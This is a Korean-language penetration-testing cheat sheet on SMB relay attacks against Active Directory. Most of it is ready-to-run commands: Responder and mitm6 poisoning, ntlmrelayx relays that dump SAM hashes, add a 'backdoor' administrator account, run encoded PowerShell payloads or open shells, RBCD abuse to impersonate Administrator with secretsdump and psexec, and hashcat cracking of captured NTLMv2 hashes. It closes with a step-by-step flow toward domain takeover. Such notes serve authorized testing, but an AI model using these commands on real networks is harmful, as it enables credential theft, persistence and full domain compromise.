# 05_SMB_Relay

# AD 외부침투 — SMB Relay

---

## 개념

SMB Relay는 LLMNR/NBT-NS/mDNS 포이즈닝으로 캡처한 NTLMv2 인증 요청을 실시간으로 다른 호스트에 전달하는 공격이다. 해시를 크래킹하는 것이 아니라 인증 자체를 중간에서 릴레이하기 때문에 패스워드 강도와 무관하게 동작하고, 복잡한 패스워드를 가진 관리자 계정도 우회할 수 있다.

동작 원리는 이렇다. 피해자가 존재하지 않는 호스트명(예: \fileserver)에 접근하려 할 때 DNS 조회가 실패하면 Windows는 LLMNR(UDP 5355), NBT-NS(UDP 137)로 브로드캐스트 질의를 보낸다. Responder는 이 질의에 “내가 그 서버다”라고 응답해 피해자를 공격자 머신으로 유인하고, 피해자가 NTLM 인증을 시도할 때 그 인증 데이터를 ntlmrelayx가 실시간으로 타겟 호스트에 전달한다.

핵심 전제 조건은 두 가지다. 첫째, 타겟 호스트의 SMB Signing이 비활성화(disabled)되어 있어야 한다. SMB Signing이 활성화된 호스트는 릴레이된 인증을 거부한다. DC는 기본적으로 SMB Signing이 강제 활성화되어 있어 릴레이 타겟이 될 수 없다. 둘째, 릴레이되는 계정이 타겟 호스트에서 관리자 권한이 있어야 SAM 덤프나 명령 실행이 가능하다. 관리자 권한이 없어도 접근 자체는 되지만 제한적이다.

---

## 사전 조건 확인

```bash
# SMB Signing 비활성 호스트 목록 자동 생성
nxc smb <서브넷>/24 --gen-relay-list relay-targets.txt

# nmap으로 직접 확인
nmap --script=smb2-security-mode -p445 <서브넷>/24
# "message_signing: disabled and not required" -> 릴레이 가능
# "message_signing: enabled and required"      -> 릴레이 불가

# 단일 호스트 확인
nxc smb <IP> -u '' -p ''
# signing:False -> 릴레이 가능
# signing:True  -> 릴레이 불가

# 생성된 타겟 파일 확인
cat relay-targets.txt
```

---

## Responder 설정

Responder와 ntlmrelayx를 동시에 실행할 때 둘 다 SMB/HTTP 서버를 열려고 하면 포트 충돌이 발생한다. ntlmrelayx가 SMB/HTTP를 처리하므로 Responder에서는 반드시 Off로 설정해야 한다.

```bash
# Responder 설정 파일 수정
vim /etc/responder/Responder.conf

# 아래 두 줄 Off로 변경
# SMB = Off
# HTTP = Off

# 또는 sed로 자동 수정
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf

# 설정 확인
grep -E "^SMB|^HTTP" /etc/responder/Responder.conf
```

---

## Responder + ntlmrelayx (LLMNR/NBT-NS 포이즈닝)

가장 기본적인 SMB Relay 구성이다. 두 개의 터미널을 열어 동시에 실행한다.

```bash
# 터미널 1 — LLMNR/NBT-NS 포이즈닝
sudo responder -I eth0 -dwv

# -d: DHCP 포이즈닝 활성화
# -w: WPAD 서버 실행
# -v: verbose 모드

# 터미널 2 — SAM 해시 덤프 (기본 동작)
sudo impacket-ntlmrelayx \
  -tf relay-targets.txt \
  -smb2support

# 명령 실행 (코드 실행 필요할 때)
sudo impacket-ntlmrelayx \
  -tf relay-targets.txt \
  -smb2support \
  -c "net user backdoor Password123! /add && net localgroup administrators backdoor /add"

# base64 PowerShell 페이로드
sudo impacket-ntlmrelayx \
  -tf relay-targets.txt \
  -smb2support \
  -c "powershell -enc <BASE64_PAYLOAD>"

# 인터랙티브 SMB 쉘 (파일 탐색, 업로드/다운로드 등)
sudo impacket-ntlmrelayx \
  -tf relay-targets.txt \
  -smb2support \
  -i
# 연결: nc 127.0.0.1 11000
# 이후: shares, use C$, ls, get <file>, put <file>

# SOCKS 프록시로 열기 (여러 툴 재사용 가능)
sudo impacket-ntlmrelayx \
  -tf relay-targets.txt \
  -smb2support \
  -socks
# 이후 /etc/proxychains4.conf에 socks4 127.0.0.1 1080 추가
# 이후: proxychains nxc smb <타겟 IP> -u '' -p '' --sam
# 이후: proxychains impacket-secretsdump corp.local/admin@<타겟 IP>

# 단일 타겟 지정 (-t)
sudo impacket-ntlmrelayx \
  -t smb://<특정 IP> \
  -smb2support

# 릴레이 성공 시 자동으로 SAM 덤프
# 출력: [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::
```

---

## mitm6 + ntlmrelayx (IPv6 DNS 포이즈닝)

LLMNR/NBT-NS가 GPO로 차단된 환경에서도 동작하는 더 강력한 방식이다. Windows는 IPv4보다 IPv6을 우선하고, DHCPv6 요청을 자동으로 브로드캐스트한다. mitm6은 이 요청에 응답해 공격자 머신을 피해자의 IPv6 DNS 서버로 등록시킨다. 이후 피해자의 모든 DNS 쿼리가 공격자를 통하게 되고, WPAD(Web Proxy Auto-Discovery) 스푸핑으로 NTLM 인증을 유도한다.

LLMNR/NBT-NS 포이즈닝과 달리 DHCPv6 리스는 기본 300초(5분) 유효하고, 피해자 머신이 재부팅하거나 네트워크를 재연결할 때 갱신된다.

```bash
# 터미널 1 — IPv6 DNS 포이즈닝
sudo mitm6 -d corp.local

# 특정 타겟만
sudo mitm6 -d corp.local -hw <타겟 호스트명>

# 터미널 2 — LDAP/LDAPS 릴레이 (컴퓨터 계정 생성)
sudo impacket-ntlmrelayx \
  -6 \
  -t ldaps://<DC_IP> \
  -wh fakewpad.corp.local \
  -l loot \
  --add-computer \
  --delegate-access

# -6: IPv6 지원 활성화
# -wh: WPAD 스푸핑 서버 주소
# -l: 덤프 결과 저장 디렉토리
# --add-computer: 새 컴퓨터 계정 생성 (RBCD 악용 준비)
# --delegate-access: 생성된 컴퓨터 계정에 대상 머신 위임 설정

# LDAP만 (정보 덤프 목적)
sudo impacket-ntlmrelayx \
  -6 \
  -t ldap://<DC_IP> \
  -wh fakewpad.corp.local \
  -l loot

# loot 디렉토리에 도메인 정보 자동 덤프
ls loot/
# domain_computers.html  domain_groups.html  domain_users.html 등
```

### mitm6 + RBCD 악용 (도메인 관리자 권한 획득)

mitm6 + LDAPS 릴레이로 컴퓨터 계정이 생성되면, RBCD(Resource-Based Constrained Delegation)를 통해 해당 컴퓨터 계정이 타겟 머신을 대신해 인증하도록 설정할 수 있다. 이를 통해 관리자 권한으로 타겟 머신에 접근 가능하다.

```bash
# 1. mitm6 + ntlmrelayx 실행 (위와 동일)
# 2. 컴퓨터 계정 생성 확인 (ntlmrelayx 출력)
# [*] Created new machine account DESKTOP-XXXXX with password YYYYYYY

# 3. 생성된 컴퓨터 계정으로 타겟에 대한 서비스 티켓 요청
impacket-getST \
  -spn HOST/<타겟호스트>.corp.local \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  'corp.local/<생성된컴퓨터계정>$:<패스워드>'

# 4. 티켓 사용
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@<타겟호스트>.corp.local
impacket-psexec -k -no-pass corp.local/Administrator@<타겟호스트>.corp.local
```

---

## NTLMv2 해시만 캡처 (릴레이 없이 오프라인 크랙)

릴레이 타겟이 없거나 모든 호스트에 SMB Signing이 활성화된 경우, 릴레이 없이 해시만 수집해서 오프라인으로 크래킹한다. 이때는 Responder의 SMB/HTTP를 On 상태로 유지해야 한다.

```bash
# Responder.conf에서 SMB, HTTP 다시 On으로 복구
sed -i 's/SMB = Off/SMB = On/g' /etc/responder/Responder.conf
sed -i 's/HTTP = Off/HTTP = On/g' /etc/responder/Responder.conf

# 해시 캡처 모드로 실행
sudo responder -I eth0 -dwv

# 캡처된 해시 위치
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-<IP>.txt 파일에 저장

# 모든 캡처 해시 한 파일로 합치기
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt > ntlmv2.hashes

# NTLMv2 크랙 (mode 5600)
hashcat -m 5600 ntlmv2.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# NTLMv1 크랙 (mode 5500, 구버전 환경)
hashcat -m 5500 ntlmv1.hashes /usr/share/wordlists/rockyou.txt

# NTLM 크랙 (mode 1000, 해시 자체)
hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt
```

---

## Inveigh (Windows에서 Responder 대체)

도메인 내부에 이미 진입한 상태에서 Windows에서 실행할 수 있는 PowerShell 기반 포이즈너다.

```powershell
Import-Module .\Inveigh.ps1

# 기본 실행
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y

# 특정 인터페이스
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -IP <공격자_IP>

# 수집된 해시 확인
Get-InveighLog
```

---

## 흐름

SMB Signing 비활성 호스트 확인 → relay-targets.txt 생성 → Responder.conf SMB/HTTP Off → ntlmrelayx 먼저 실행 → Responder 실행 → 인증 유도 대기 → SAM 덤프 / 쉘 획득 / SOCKS 프록시 활용

LLMNR 막혀있으면 → mitm6으로 IPv6 DNS 포이즈닝 → LDAPS 릴레이 → 컴퓨터 계정 생성 → RBCD 악용 → 도메인 장악